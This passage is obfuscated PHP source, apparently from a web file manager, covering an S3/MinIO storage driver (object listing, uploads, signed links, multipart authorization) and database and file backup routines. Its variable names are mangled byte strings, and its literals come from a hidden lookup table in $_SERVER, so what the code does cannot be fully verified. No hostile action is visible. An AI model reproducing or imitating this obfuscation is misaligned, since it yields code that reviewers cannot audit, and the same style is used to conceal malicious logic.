$âñ√†…ò[$ŒÀ‹éØŒ[86]] = 0; $âñ√†…ò[$ŒÀ‹éØŒ[194]] = $âñ√†…ò[$ŒÀ‹éØŒ[195]] = !0; if ($˛õÈÅﬂî == $ŒÀ‹éØŒ[12]) { return $âñ√†…ò; } $˛õÈÅﬂî = trim($˛õÈÅﬂî, $ŒÀ‹éØŒ[8]) . $ŒÀ‹éØŒ[8]; $ö–º⁄÷‚ = $this->objectMeta($˛õÈÅﬂî); if (isset($ö–º⁄÷‚[$ŒÀ‹éØŒ[196]])) { $âñ√†…ò[$ŒÀ‹éØŒ[193]] = $ö–º⁄÷‚[$ŒÀ‹éØŒ[196]]; } return $âñ√†…ò; } private function fileList($–∆«ëÔ⁄, $∞‡ü˚√≈ = '', $Ω˝Ωÿ¢ë = 0) { $”¡„É‰‡ =& $_SERVER[Çâä∆◊¡]; $øë»˜ù¢ = rtrim($–∆«ëÔ⁄, $”¡„É‰‡[8]) . $”¡„É‰‡[8]; $ãÅ”Æ‘¶ = $this->listObjs($øë»˜ù¢, null, null, $∞‡ü˚√≈); if (!$ãÅ”Æ‘¶) { return array($”¡„É‰‡[77] => array(), $”¡„É‰‡[76] => array()); } $ªåã≈Ñ¨ = $this->listItemCache === !1 ? !1 : !0; $¨ªá¡¢ = $µà®™π˙ = array(); foreach ($ãÅ”Æ‘¶[$”¡„É‰‡[197]] as $‘≠à©Ä¯) { $ÂéÛ¿Ê… = $‘≠à©Ä¯[$”¡„É‰‡[32]]; if ($ÂéÛ¿Ê… == $øë»˜ù¢) { continue; } $∫ãøœµÅ = isset($‘≠à©Ä¯[$”¡„É‰‡[80]]) ? $‘≠à©Ä¯[$”¡„É‰‡[80]] : 0; $≠éÑÈ˚ñ = $∫ãøœµÅ == 0 && substr($ÂéÛ¿Ê…, strlen($ÂéÛ¿Ê…) - 1, 1) == $”¡„É‰‡[8] ? !0 : !1; if ($ªåã≈Ñ¨) { $this->cacheMethod($”¡„É‰‡[198], $ÂéÛ¿Ê…, $≠éÑÈ˚ñ); $this->cacheMethod($”¡„É‰‡[199], $ÂéÛ¿Ê…, $‘≠à©Ä¯); } if ($≠éÑÈ˚ñ) { $¨ªá¡¢[] = $ÂéÛ¿Ê…; continue; } $µà®™π˙[] = $Ω˝Ωÿ¢ë ? $‘≠à©Ä¯ : $ÂéÛ¿Ê…; } foreach ($ãÅ”Æ‘¶[$”¡„É‰‡[200]] as $‘≠à©Ä¯) { $¨ªá¡¢[] = $‘≠à©Ä¯[$”¡„É‰‡[32]]; if ($ªåã≈Ñ¨) { $this->cacheMethod($”¡„É‰‡[198], $‘≠à©Ä¯[$”¡„É‰‡[32]], !0); } } if ($ªåã≈Ñ¨) { $this->cacheMethod($”¡„É‰‡[198], $–∆«ëÔ⁄, !0); } return array($”¡„É‰‡[77] => $¨ªá¡¢, $”¡„É‰‡[76] => $µà®™π˙); } private function listObjs($˛∫≠Õ‘µ, $›‚„Ïú† = null, $ñﬁ°¬…◊ = null, $“π≤≥∆§ = null) { $Ë⁄·ñ˜ﬁ =& $_SERVER[Çâä∆◊¡]; $˛∫≠Õ‘µ = trim($˛∫≠Õ‘µ, $Ë⁄·ñ˜ﬁ[8]); $ÆÓıõ˙© = empty($˛∫≠Õ‘µ) && $˛∫≠Õ‘µ !== $Ë⁄·ñ˜ﬁ[190] ? $Ë⁄·ñ˜ﬁ[12] : $˛∫≠Õ‘µ . $Ë⁄·ñ˜ﬁ[8]; return $this->client->getBucket($this->bucket, $ÆÓıõ˙©, $›‚„Ïú†, $ñﬁ°¬…◊, $“π≤≥∆§, !0); } public function has($ÖÂ˜ûœÃ, $â∫∂√≈Ó = false, $Â˜ç∑Ü∂ = true) { $êÑ•Ø√ô =& $_SERVER[Çâä∆◊¡]; $ÖÂ˜ûœÃ = trim($ÖÂ˜ûœÃ, $êÑ•Ø√ô[8]); $‚ÂîÚò§ = empty($ÖÂ˜ûœÃ) && $ÖÂ˜ûœÃ !== $êÑ•Ø√ô[190] ? $êÑ•Ø√ô[12] : $ÖÂ˜ûœÃ . $êÑ•Ø√ô[8]; $˘ ù©ôØ = null; $Ω–≤Ã‹„ = 500; $Èö¯‰Çª = $êÑ•Ø√ô[8]; $è˛†ÑäΩ = $ù‰˚Óèı = array(); while (!0) { $¥ÉΩ≥≥Ö = $this->listObjs($ÖÂ˜ûœÃ, $˘ ù©ôØ, $Ω–≤Ã‹„, $Èö¯‰Çª); if (!$¥ÉΩ≥≥Ö) { break; } $˘ ù©ôØ = $¥ÉΩ≥≥Ö[$êÑ•Ø√ô[201]]; $ÍÕõ„ß¿ = $¥ÉΩ≥≥Ö[$êÑ•Ø√ô[197]]; $ˆ£≥Íµ‰ = $¥ÉΩ≥≥Ö[$êÑ•Ø√ô[200]]; if (empty($ÍÕõ„ß¿) && empty($ˆ£≥Íµ‰)) { break; } if (count($ÍÕõ„ß¿) == 1 && $ÍÕõ„ß¿[0][$êÑ•Ø√ô[32]] == $‚ÂîÚò§) { break; } if ($â∫∂√≈Ó) { if (count($ÍÕõ„ß¿)) { $ÍÕõ„ß¿ = array_column($ÍÕõ„ß¿, $êÑ•Ø√ô[32]); $è˛†ÑäΩ = array_merge($è˛†ÑäΩ, $ÍÕõ„ß¿); } if (count($ˆ£≥Íµ‰)) { $ˆ£≥Íµ‰ = array_column($ˆ£≥Íµ‰, $êÑ•Ø√ô[32]); $ù‰˚Óèı = array_merge($ù‰˚Óèı, $ˆ£≥Íµ‰); } if ($˘ ù©ôØ === null) { break; } continue; } if ($Â˜ç∑Ü∂) { if (!empty($ÍÕõ„ß¿)) { if (count($ÍÕõ„ß¿) > 1 || isset($ÍÕõ„ß¿[0][$êÑ•Ø√ô[32]]) && $ÍÕõ„ß¿[0][$êÑ•Ø√ô[32]] != $‚ÂîÚò§) { return !0; } } } else { if (!empty($ˆ£≥Íµ‰)) { return !0; } } if ($˘ ù©ôØ === null) { break; } } if ($â∫∂√≈Ó) { $è˛†ÑäΩ = array_diff($è˛†ÑäΩ, array($‚ÂîÚò§)); $è˛†ÑäΩ = count(array_unique($è˛†ÑäΩ)); $ù‰˚Óèı = count(array_unique($ù‰˚Óèı)); return array($êÑ•Ø√ô[202] => $è˛†ÑäΩ, $êÑ•Ø√ô[203] => $ù‰˚Óèı); } return !1; } public function listAll($«ÿ‚Í◊€) { $Ó∞ç‡¡° =& $_SERVER[Çâä∆◊¡]; $∫âŸ√Â¬ = $this->fileList($«ÿ‚Í◊€, $Ó∞ç‡¡°[12], !0); $õ´˜ÜÀπ = array(); foreach ($∫âŸ√Â¬[$Ó∞ç‡¡°[76]] as $ÑÙ€–¥™) { $õ´˜ÜÀπ[$ÑÙ€–¥™[$Ó∞ç‡¡°[32]]] = $ÑÙ€–¥™[$Ó∞ç‡¡°[80]]; } foreach ($∫âŸ√Â¬[$Ó∞ç‡¡°[77]] as $ÑÙ€–¥™) { if (is_string($ÑÙ€–¥™)) { $õ´˜ÜÀπ[$ÑÙ€–¥™] = 0; } } return $this->listAllFiles($«ÿ‚Í◊€, array_keys($õ´˜ÜÀπ), $õ´˜ÜÀπ); } public function canRead($¿Ω”ï§Ö) { $ÄπÙ√»ª =& $_SERVER[Çâä∆◊¡]; $˜ƒÆ´¢œ = $this->client->getAccessControlPolicy($this->bucket, $¿Ω”ï§Ö); if (!$˜ƒÆ´¢œ) { return !1; } return in_array($˜ƒÆ´¢œ, array($ÄπÙ√»ª[204], $ÄπÙ√»ª[205], $ÄπÙ√»ª[206])) ? !0 : !1; } public function canWrite($Ìè•À¿É) { $ıÍÂ›ç„ =& $_SERVER[Çâä∆◊¡]; $£‰Œïı€ = $this->client->getAccessControlPolicy($this->bucket, $Ìè•À¿É); if (!$£‰Œïı€) { return !1; } return in_array($£‰Œïı€, array($ıÍÂ›ç„[204], $ıÍÂ›ç„[205])) ? !0 : !1; } public function getContent($Ï⁄”≠∆€) { return $this->client->getObject($this->bucket, $Ï⁄”≠∆€); } public function setContent($ıò„Û≥∑, $ä»é˝°á = '', $÷ﬁ¶ÿ—† = false) { $™ü∫˘–˚ =& $_SERVER[Çâä∆◊¡]; $ıò„Û≥∑ = $÷ﬁ¶ÿ—† ? trim($ıò„Û≥∑, $™ü∫˘–˚[8]) . $™ü∫˘–˚[8] : $ıò„Û≥∑; $˚ÌÁ∂≥ß = get_file_mime(get_path_ext($ıò„Û≥∑)); $≈Ë⁄Ç≠– = $this->client->putObject($ä»é˝°á, $this->bucket, $ıò„Û≥∑, $™ü∫˘–˚[191], array(), $˚ÌÁ∂≥ß); if (!$≈Ë⁄Ç≠–) { return !1; } if ($÷ﬁ¶ÿ—†) { return !0; } $this->cacheMethod(null, null); $≈Ë⁄Ç≠– = $this->copyFile($ıò„Û≥∑, $ıò„Û≥∑, array($™ü∫˘–˚[207] => $≈Ë⁄Ç≠–[$™ü∫˘–˚[208]])); return $≈Ë⁄Ç≠– ? !0 : !1; } public function fileSubstr($òóØ¯€å, $Ìßﬂíßè, $«˝£Ø‚è) { $âΩã‹•† = $Ìßﬂíßè + $«˝£Ø‚è - 1; return $this->client->getObject($this->bucket, $òóØ¯€å, array($_SERVER[Çâä∆◊¡][209] => "\x62\171\164\x65\163\x3d{$Ìßﬂíßè}\x2d{$âΩã‹•†}")); } public function upload($ Ú ˘±Ú, $ºﬁ›¨òÊ, $íÄê˚ ú = false, $∑…¿¶˛⁄ = REPEAT_REPLACE) { $îñœ∏ﬁ∏ =& $_SERVER[Çâä∆◊¡]; $∑ñ¿áŒ© = array($îñœ∏ﬁ∏[207] => @md5_file($ºﬁ›¨òÊ)); $⁄áûñºâ = array($îñœ∏ﬁ∏[210] => get_file_mime(get_path_ext($ Ú ˘±Ú))); if (IO::size($ºﬁ›¨òÊ) <= 1024 * 1024 * 200) { $∞á◊íÕ’ = $this->client->putObjectFile($ºﬁ›¨òÊ, $this->bucket, $ Ú ˘±Ú, $îñœ∏ﬁ∏[191], $∑ñ¿áŒ©, $⁄áûñºâ); return !empty($∞á◊íÕ’) ? $this->getPathOuter($ Ú ˘±Ú) : !1; } $Ç›ø–ºÈ = $this->client->multiUploadObject($ºﬁ›¨òÊ, $this->bucket, trim($ Ú ˘±Ú, $îñœ∏ﬁ∏[8]), $∑ñ¿áŒ©, $⁄áûñºâ); return $Ç›ø–ºÈ ? $this->getPathOuter($ Ú ˘±Ú) : !1; } public function download($¨ºªÈ◊·, $Ó«π£ñ°) { if (!@is_dir($this->pathFather($Ó«π£ñ°)) && !IO::mkdir($this->pathFather($Ó«π£ñ°))) { return !1; } $ÿ›‡ÈÈÏ = $this->client->getObject($this->bucket, $¨ºªÈ◊·, array(), $Ó«π£ñ°); return $ÿ›‡ÈÈÏ !== !1 ? $Ó«π£ñ° : !1; } public function link($µ˜˚°‹, $ÜÙÆø„¿ = array()) { $¶ÿñŒ©˚ =& $_SERVER[Çâä∆◊¡]; if ($this->signVer == $¶ÿñŒ©˚[211]) { return $this->client->getAuthenticatedURL($this->bucket, $µ˜˚°‹, 3600 * 12, $ÜÙÆø„¿); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($µ˜˚°‹, $¶ÿñŒ©˚[8]), 3600 * 12, $this->region, array(), !0, $ÜÙÆø„¿); } public function fileOut($Á◊ïŸ≤í, $æÌ»≥ô÷ = false, $Ç∂ïœôÙ = false, $ßêÒÈÆÕ = '') { $®°Í›Ù˝ =& $_SERVER[Çâä∆◊¡]; if ($this->isFileOutServer()) { return $this->fileOutServer($Á◊ïŸ≤í, $æÌ»≥ô÷, $Ç∂ïœôÙ, $ßêÒÈÆÕ); } if (!$Ç∂ïœôÙ) { $Ç∂ïœôÙ = $this->pathThis($Á◊ïŸ≤í); } $ﬂÈÎ¨üâ = get_file_mime(get_path_ext($Ç∂ïœôÙ)); if ($ﬂÈÎ¨üâ == $®°Í›Ù˝[212]) { return parent::fileOut($Á◊ïŸ≤í, $æÌ»≥ô÷, $Ç∂ïœôÙ, $ßêÒÈÆÕ); } $∑ì£á≥í = array($®°Í›Ù˝[213] => $ﬂÈÎ¨üâ); if ($æÌ»≥ô÷) { $∑ì£á≥í[$®°Í›Ù˝[214]] = $®°Í›Ù˝[215] . rawurlencode($Ç∂ïœôÙ); } else { } $¥“≥ÊÖÛ = $this->link($Á◊ïŸ≤í, $∑ì£á≥í); $this->fileOutLink($¥“≥ÊÖÛ); } public function fileOutServer($º˘ƒ„æ£, $∞ï˝Õ¡‰ = false, $¢Ã™ÓÁù = false, $œ¯»ì = '') { parent::fileOut($º˘ƒ„æ£, $∞ï˝Õ¡‰, $¢Ã™ÓÁù, $œ¯»ì); } public function fileOutImageServer($¡≈Üé∑ﬁ, $‚¶ÒıÜ˜ = 250) { parent::fileOutImage($¡≈Üé∑ﬁ, $‚¶ÒıÜ˜); } public function hashMd5($≥ÁÉﬂê√, $Ñ˘Ωê∂” = '') { $›®ÁÀåπ =& $_SERVER[Çâä∆◊¡]; $ËØ›‘°π = $this->objectMeta($≥ÁÉﬂê√); if (!$ËØ›‘°π) { return !1; } $Ñ˘Ωê∂” = $Ñ˘Ωê∂” ? $Ñ˘Ωê∂” : _get($ËØ›‘°π, $›®ÁÀåπ[216]); $Ñ˘Ωê∂” = $Ñ˘Ωê∂” ? $Ñ˘Ωê∂” : _get($ËØ›‘°π, $›®ÁÀåπ[208], $›®ÁÀåπ[12]); return $Ñ˘Ωê∂”; } public function uploadFormData($√ÁÌ˘ÙÙ, $µ‡ô∑©˘ = 3600) { $‰’ÕêŒ⁄ =& $_SERVER[Çâä∆◊¡]; $≤Áô≈Ë√ = $this->pathFather($√ÁÌ˘ÙÙ); $∂ç∏≈›œ = $this->client->getHttpUploadPostParams($this->bucket, $≤Áô≈Ë√, $‰’ÕêŒ⁄[191], $µ‡ô∑©˘); return array_merge((array) $∂ç∏≈›œ, array($‰’ÕêŒ⁄[174] => $this->getHost())); } public function multiUploadFormData($‰∏ ƒ›˝, $ô£„õå = 3600) { $–„ÀÙõ™ =& $_SERVER[Çâä∆◊¡]; $óâö˙ÃÜ = gmdate($–„ÀÙõ™[217]); $€´€≠â™ = array(); $Ûª¥¶ÑÛ = $this->client->getUploadId($this->bucket, $‰∏ ƒ›˝, $€´€≠â™); if (!$Ûª¥¶ÑÛ) { return !1; } return array($–„ÀÙõ™[218] => $Ûª¥¶ÑÛ, $–„ÀÙõ™[174] => $this->getHost() . $–„ÀÙõ™[8] . $this->pathEncode($‰∏ ƒ›˝), $–„ÀÙõ™[219] => $óâö˙ÃÜ, $–„ÀÙõ™[95] => $‰∏ ƒ›˝); } public function multiUploadAuthData($˘ÚÓ€Öâ, $¬ê€âµ◊ = array()) { $–°ïÈπﬁ =& $_SERVER[Çâä∆◊¡]; $»úƒï›ï = isset($¬ê€âµ◊[$–°ïÈπﬁ[219]]) ? $¬ê€âµ◊[$–°ïÈπﬁ[219]] : gmdate($–°ïÈπﬁ[217]); $–› ƒ·– = isset($¬ê€âµ◊[$–°ïÈπﬁ[167]]) ? $¬ê€âµ◊[$–°ïÈπﬁ[167]] : $–°ïÈπﬁ[12]; $˘ƒ”ÇõÑ = $¬ê€âµ◊[$–°ïÈπﬁ[95]]; unset($¬ê€âµ◊[$–°ïÈπﬁ[95]]); if (isset($¬ê€âµ◊[$–°ïÈπﬁ[220]])) { $¬ê€âµ◊[$–°ïÈπﬁ[219]] = $»úƒï›ï; return $this->listUploadParts($˘ƒ”ÇõÑ, $¬ê€âµ◊); } $ô⁄˛πê¢ = array($–°ïÈπﬁ[221], $–°ïÈπﬁ[12], $–°ïÈπﬁ[118], $–°ïÈπﬁ[12], "\x78\x2d\141\x6d\172\55\x64\141\x74\145\x3a{$»úƒï›ï}", $–°ïÈπﬁ[8] . $this->bucket . $–°ïÈπﬁ[8] . $this->pathEncode($˘ƒ”ÇõÑ) . $–› ƒ·–); if (strpos($–› ƒ·–, $–°ïÈπﬁ[222]) === 0) { $ô⁄˛πê¢[0] = $–°ïÈπﬁ[223]; } if (isset($¬ê€âµ◊[$–°ïÈπﬁ[224]]) && $¬ê€âµ◊[$–°ïÈπﬁ[224]] == $–°ïÈπﬁ[225]) { $ô⁄˛πê¢[0] = $–°ïÈπﬁ[225]; } $áæ¸«ÂÜ = implode($–°ïÈπﬁ[226], $ô⁄˛πê¢); $Íˆë¬«Â = base64_encode(hash_hmac($–°ïÈπﬁ[227], $áæ¸«ÂÜ, $this->secret, !0)); $£¸ÿ˝•ÿ = $–°ïÈπﬁ[228] . $this->accessKey . $–°ïÈπﬁ[4] . $Íˆë¬«Â; if (strpos($–› ƒ·–, $–°ïÈπﬁ[222]) === 0) { return array($–°ïÈπﬁ[229] => $£¸ÿ˝•ÿ, $–°ïÈπﬁ[219] => $»úƒï›ï); } return $£¸ÿ˝•ÿ; } public function listUploadParts($¨™¬ä∫÷, $õûå≈º… = array()) { $åÜû´«… =& $_SERVER[Çâä∆◊¡]; $ÔË»œè¿ = str_replace($åÜû´«…[230], $åÜû´«…[12], $õûå≈º…[$åÜû´«…[167]]); $é∞¡ˆ™» = $this->client->listParts($this->bucket, $¨™¬ä∫÷, $ÔË»œè¿); if (!$é∞¡ˆ™») { return !1; } unset($õûå≈º…[$åÜû´«…[220]], $õûå≈º…[$åÜû´«…[224]]); $õûå≈º…[$åÜû´«…[95]] = $¨™¬ä∫÷; $ªôœ÷˜§ = $this->multiUploadAuthData($¨™¬ä∫÷, $õûå≈º…); if (empty($ªôœ÷˜§)) { return !1; } return array($åÜû´«…[229] => $ªôœ÷˜§, $åÜû´«…[219] => $õûå≈º…[$åÜû´«…[219]], $åÜû´«…[231] => $é∞¡ˆ™»); } public function getHost() { return parent::getHost() . $_SERVER[Çâä∆◊¡][8] . $this->bucket; } public function size($˜À≥¨Ñ ) { $º∞´£Ô = $this->objectMeta($˜À≥¨Ñ ); return $º∞´£Ô ? $º∞´£Ô[$_SERVER[Çâä∆◊¡][80]] : 0; } public function info($âç≠ò•π) { if ($this->isFolder($âç≠ò•π)) { return $this->folderInfo($âç≠ò•π); } else { if ($this->isFile($âç≠ò•π)) { return $this->fileInfo($âç≠ò•π); } } return !1; } public function exist($Ω…œˆ“í) { return $this->isFile($Ω…œˆ“í) || $this->isFolder($Ω…œˆ“í); } public function isFile($Î©—◊ì√) { return !$this->isFolder($Î©—◊ì√) && $this->objectMeta($Î©—◊ì√); } public function isFolder($™§Â∏àÍ) { return $this->cacheMethod($_SERVER[Çâä∆◊¡][198], $™§Â∏àÍ); } protected function objectMeta($≥Ø¶ÈÆ„) { return $this->cacheMethod($_SERVER[Çâä∆◊¡][199], $≥Ø¶ÈÆ„); } protected function _objectMeta($ï÷Ñº«Ì) { $ÏúÇä“ä =& $_SERVER[Çâä∆◊¡]; $ï÷Ñº«Ì = rtrim($ï÷Ñº«Ì, $ÏúÇä“ä[8]); try { $ÿ˝ΩëŸΩ = $this->client->getObjectInfo($this->bucket, $ï÷Ñº«Ì); if (!isset($ÿ˝ΩëŸΩ[$ÏúÇä“ä[216]]) && isset($ÿ˝ΩëŸΩ[$ÏúÇä“ä[232]])) { $ÿ˝ΩëŸΩ[$ÏúÇä“ä[216]] = $ÿ˝ΩëŸΩ[$ÏúÇä“ä[232]]; } } catch (Exception $ÎºÓÀ¯ª) { $ÿ˝ΩëŸΩ = !1; } if (!$ÿ˝ΩëŸΩ) { } return $ÿ˝ΩëŸΩ; } protected function _isFolder($’¯£™¡ì) { $˘óÄêÆ“ =& $_SERVER[Çâä∆◊¡]; $’¯£™¡ì = rtrim($’¯£™¡ì, $˘óÄêÆ“[8]); if ($’¯£™¡ì == $˘óÄêÆ“[12] || $’¯£™¡ì == $˘óÄêÆ“[8]) { return !0; } $Òﬂ¸ı±¬ = $this->client->getBucket($this->bucket, $’¯£™¡ì, null, 1); if (empty($Òﬂ¸ı±¬[$˘óÄêÆ“[197]])) { return !1; } $˛¯“ÂŸò = $Òﬂ¸ı±¬[$˘óÄêÆ“[197]][0][$˘óÄêÆ“[32]]; return stripos($˛¯“ÂŸò, $’¯£™¡ì . $˘óÄêÆ“[8]) === 0 ? !0 : !1; if (substr($˛¯“ÂŸò, -1) == $˘óÄêÆ“[8]) { return !0; } if (get_path_this($˛¯“ÂŸò) == get_path_this($’¯£™¡ì)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Í•º∂†œ) { parent::__construct($Í•º∂†œ); $this->signatureVersion($_SERVER[Çâä∆◊¡][211]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto bËú÷å∆Ì¢; D‘¬¡èã´Ê: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $‘õÄú‡æ =& $_SERVER[Çâä∆◊¡]; $πôÔØìª = Backup::get(); self::$io = $πôÔØìª[$‘õÄú‡æ[745]]; self::$name = $πôÔØìª[$‘õÄú‡æ[32]]; $∞‹Èª∆Ê = new DbManage(); $Ë≤ÚÖÏÔ = $∞‹Èª∆Ê->dbType(); $Å™∑Öõ⁄ = array($‘õÄú‡æ[769] => $Ë≤ÚÖÏÔ, $‘õÄú‡æ[770] => time()); Backup::set($Å™∑Öõ⁄); $∑÷Ì∑Úß = $this->tmpFilesPath() . $‘õÄú‡æ[771] . self::$name . $‘õÄú‡æ[8]; del_dir($∑÷Ì∑Úß); mk_dir($∑÷Ì∑Úß); $ƒÅµ≥Ü— = $Õ‹®ô≥¯ = 0; $ùÍÃí‰Û = new Task($‘õÄú‡æ[772], $‘õÄú‡æ[773], 0, LNG($‘õÄú‡æ[774]) . $‘õÄú‡æ[775] . LNG($‘õÄú‡æ[776])); try { $Åø§¥©Î = $∞‹Èª∆Ê->db()->getTables(); } catch (Exception $•⁄ÈÌ†Ω) { $ùÍÃí‰Û->end(); return !1; } $Åø§¥©Î = array_diff($Åø§¥©Î, array($‘õÄú‡æ[777], $‘õÄú‡æ[778])); foreach ($Åø§¥©Î as $ı‹ÓçìÈ) { $ƒÅµ≥Ü— += $∞‹Èª∆Ê->model($ı‹ÓçìÈ)->count(); } $ùÍÃí‰Û->task[$‘õÄú‡æ[779]] = $ƒÅµ≥Ü—; $GLOBALS[$‘õÄú‡æ[780]] = self::$name; foreach ($Åø§¥©Î as $ı‹ÓçìÈ) { $„çé”ñ® = $∑÷Ì∑Úß . $ı‹ÓçìÈ . $‘õÄú‡æ[781]; $Ö√⁄Æ˜° = null; if ($ı‹ÓçìÈ == $‘õÄú‡æ[782] && (!isset($πôÔØìª[$‘õÄú‡æ[748]]) || $πôÔØìª[$‘õÄú‡æ[748]] == $‘õÄú‡æ[190])) { $Ö√⁄Æ˜° = self::$io; } $Õ‹®ô≥¯ += $∞‹Èª∆Ê->sqlFromDb($ı‹ÓçìÈ, $„çé”ñ®, $ùÍÃí‰Û, $Ö√⁄Æ˜°); } unset($GLOBALS[$‘õÄú‡æ[780]]); $ùÍÃí‰Û->end(); if ($Õ‹®ô≥¯ > $ƒÅµ≥Ü—) { $ƒÅµ≥Ü— = $Õ‹®ô≥¯; } $Å™∑Öõ⁄ = array($‘õÄú‡æ[769] => $Ë≤ÚÖÏÔ, $‘õÄú‡æ[766] => 1, $‘õÄú‡æ[783] => $ƒÅµ≥Ü—, $‘õÄú‡æ[784] => $Õ‹®ô≥¯, $‘õÄú‡æ[785] => time()); Backup::set($Å™∑Öõ⁄); if ($ƒÅµ≥Ü— - $Õ‹®ô≥¯ > 0) { $‹Ö€÷∑‡ = $‘õÄú‡æ[786]; if (stristr(I18n::getType(), $‘õÄú‡æ[787])) { $‹Ö€÷∑‡ = $‘õÄú‡æ[788]; } write_log(array($‹Ö€÷∑‡, $Å™∑Öõ⁄), $‘õÄú‡æ[773]); return !1; } return !0; } private function tmpFilesPath() { $¸¶®ÉﬂÍ =& $_SERVER[Çâä∆◊¡]; $ßÜ˜ ¯Ç = TEMP_FILES; if ($GLOBALS[$¸¶®ÉﬂÍ[6]][$¸¶®ÉﬂÍ[90]][$¸¶®ÉﬂÍ[789]]) { $ßÜ˜ ¯Ç = $GLOBALS[$¸¶®ÉﬂÍ[6]][$¸¶®ÉﬂÍ[90]][$¸¶®ÉﬂÍ[789]]; if (!mk_dir($ßÜ˜ ¯Ç) || !is_writable($ßÜ˜ ¯Ç) || !IO::mkfile($ßÜ˜ ¯Ç . $¸¶®ÉﬂÍ[790])) { $ßÜ˜ ¯Ç = TEMP_FILES; } } return $ßÜ˜ ¯Ç; } } class BackupDbFile { public function __construct() { } public function index() { $¶¿¸ﬂπ¿ =& $_SERVER[Çâä∆◊¡]; $‚–†¶ôî = Backup::get(); $ú‡àï÷Ê = $‚–†¶ôî[$¶¿¸ﬂπ¿[32]]; $Æ™ÿÑ£“ = $this->tmpFilesPath() . "\x62\x61\143\153\x75\160\137{$ú‡àï÷Ê}\x2f"; $Œù¬º¿∂ = $this->backupPath($‚–†¶ôî); if (!($Œù¬º¿∂ = IO::mkdir($Œù¬º¿∂))) { return !1; } $˛©ﬁí≠⁄ = IO::listPath($Æ™ÿÑ£“); $ÍçÄ˛ºè = isset($˛©ﬁí≠⁄[$¶¿¸ﬂπ¿[76]]) ? $˛©ﬁí≠⁄[$¶¿¸ﬂπ¿[76]] : array(); $©Ø«√ª√ = array_sum(array_column($ÍçÄ˛ºè, $¶¿¸ﬂπ¿[80])); if (!$©Ø«√ª√) { return !1; } $áÃëÚ¢¨ = array($¶¿¸ﬂπ¿[791] => $©Ø«√ª√, $¶¿¸ﬂπ¿[792] => time()); Backup::set($áÃëÚ¢¨); $´ìªú¿» = new TaskFileTransfer($¶¿¸ﬂπ¿[793], $¶¿¸ﬂπ¿[773], count($ÍçÄ˛ºè), LNG($¶¿¸ﬂπ¿[774]) . $¶¿¸ﬂπ¿[460] . LNG($¶¿¸ﬂπ¿[776]) . $¶¿¸ﬂπ¿[794]); $´ìªú¿»->task[$¶¿¸ﬂπ¿[756]] = $©Ø«√ª√; foreach ($˛©ﬁí≠⁄[$¶¿¸ﬂπ¿[76]] as $ÂªûÙ˙ﬁ) { $®«—÷º¢ = IO::move($ÂªûÙ˙ﬁ[$¶¿¸ﬂπ¿[78]], $Œù¬º¿∂); if (!$®«—÷º¢) { $´ìªú¿»->end(); $îŒ˜Ä∂Û = IO::getLastError($¶¿¸ﬂπ¿[795] . $ÂªûÙ˙ﬁ[$¶¿¸ﬂπ¿[78]] . $¶¿¸ﬂπ¿[796] . $Œù¬º¿∂ . $¶¿¸ﬂπ¿[536]); write_log($îŒ˜Ä∂Û, $¶¿¸ﬂπ¿[773]); return !1; } } $Ï‡ òúÌ = new DbManage(); $ïÕæ∂£‘ = $Ï‡ òúÌ->getSqlFile(); if (!$ïÕæ∂£‘[$¶¿¸ﬂπ¿[797]] || !$ïÕæ∂£‘[$¶¿¸ﬂπ¿[13]]) { return !1; } IO::move($ïÕæ∂£‘[$¶¿¸ﬂπ¿[797]], $Œù¬º¿∂); IO::move($ïÕæ∂£‘[$¶¿¸ﬂπ¿[13]], $Œù¬º¿∂); $´ìªú¿»->end(); $áÃëÚ¢¨ = array($¶¿¸ﬂπ¿[798] => $©Ø«√ª√, $¶¿¸ﬂπ¿[799] => time()); Backup::set($áÃëÚ¢¨); return !0; } private function backupPath($£≈ÿÌóÂ) { $Õ‡˜ØÖê =& $_SERVER[Çâä∆◊¡]; $¡∑“èÉ˝ = $£≈ÿÌóÂ[$Õ‡˜ØÖê[32]]; $≤‡˛◊ã  = Model($Õ‡˜ØÖê[763])->get($Õ‡˜ØÖê[764]); $›÷˚ÛÛƒ = substr(md5($Õ‡˜ØÖê[765] . $≤‡˛◊ã  . $¡∑“èÉ˝), 0, 8); return "\x7b\x69\157\x3a{$£≈ÿÌóÂ[$Õ‡˜ØÖê[745]]}\x7d\57\144\141\x74\x61\x62\141\163\x65\57\142\141\x63\x6b\x75\x70\57" . $¡∑“èÉ˝ . $Õ‡˜ØÖê[11] . $›÷˚ÛÛƒ; } private function tmpFilesPath() { $î™å¯ÁÚ =& $_SERVER[Çâä∆◊¡]; $Ç…ûóœ¨ = TEMP_FILES; if ($GLOBALS[$î™å¯ÁÚ[6]][$î™å¯ÁÚ[90]][$î™å¯ÁÚ[789]]) { $Ç…ûóœ¨ = $GLOBALS[$î™å¯ÁÚ[6]][$î™å¯ÁÚ[90]][$î™å¯ÁÚ[789]]; if (!mk_dir($Ç…ûóœ¨) || !is_writable($Ç…ûóœ¨) || !IO::mkfile($Ç…ûóœ¨ . $î™å¯ÁÚ[790])) { $Ç…ûóœ¨ = TEMP_FILES; } } return $Ç…ûóœ¨; } } class BackupFile { public function __construct() { } public function index() { $˙Ï◊úßí = Backup::get(); $àô¡Î∂Î = $˙Ï◊úßí[$_SERVER[Çâä∆◊¡][288]][$_SERVER[Çâä∆◊¡][192]][$_SERVER[Çâä∆◊¡][467]]; $±Ï±úËç = array($_SERVER[Çâä∆◊¡][468] => array($_SERVER[Çâä∆◊¡][800], $àô¡Î∂Î), $_SERVER[Çâä∆◊¡][801] => array($_SERVER[Çâä∆◊¡][326], $˙Ï◊úßí[$_SERVER[Çâä∆◊¡][745]])); $ùäø†∫∏ = (int) Model($_SERVER[Çâä∆◊¡][782])->where($±Ï±úËç)->count($_SERVER[Çâä∆◊¡][467]); $ª’‚ŸÄ = (int) Model($_SERVER[Çâä∆◊¡][782])->where($±Ï±úËç)->sum($_SERVER[Çâä∆◊¡][80]); $ßŒ∆Ω»˝ = new TaskFileTransfer($_SERVER[Çâä∆◊¡][802], $_SERVER[Çâä∆◊¡][773], $ùäø†∫∏, LNG($_SERVER[Çâä∆◊¡][774]) . $_SERVER[Çâä∆◊¡][775] . LNG($_SERVER[Çâä∆◊¡][803])); $ßŒ∆Ω»˝->task[$_SERVER[Çâä∆◊¡][756]] = $ª’‚ŸÄ; 